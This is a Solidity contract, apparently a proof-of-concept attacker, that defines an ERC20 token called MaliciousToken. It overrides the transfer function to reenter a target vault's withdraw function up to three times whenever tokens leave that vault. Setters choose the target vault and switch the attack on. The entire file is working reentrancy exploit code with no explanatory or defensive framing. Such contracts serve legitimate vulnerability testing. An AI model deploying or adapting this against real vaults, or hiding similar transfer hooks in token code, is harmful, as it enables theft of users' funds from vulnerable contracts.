// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IVault {
    function withdraw(uint256 shares) external;
}

contract MaliciousToken is ERC20 {
    address public vault;
    bool public attacking;
    uint256 public attackCount;

    constructor() ERC20("MFDOOM", "ALLCAPS") {
        _mint(msg.sender, 1_000_000 ether);
    }

    function setVault(address _vault) external {
        vault = _vault;
    }

    function setAttacking(bool _attacking) external {
        attacking = _attacking;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        super._transfer(from, to, amount);

        if (from == vault && attacking && attackCount < 3) {
            attackCount++;
            IVault(vault).withdraw(1);
        }
    }
}
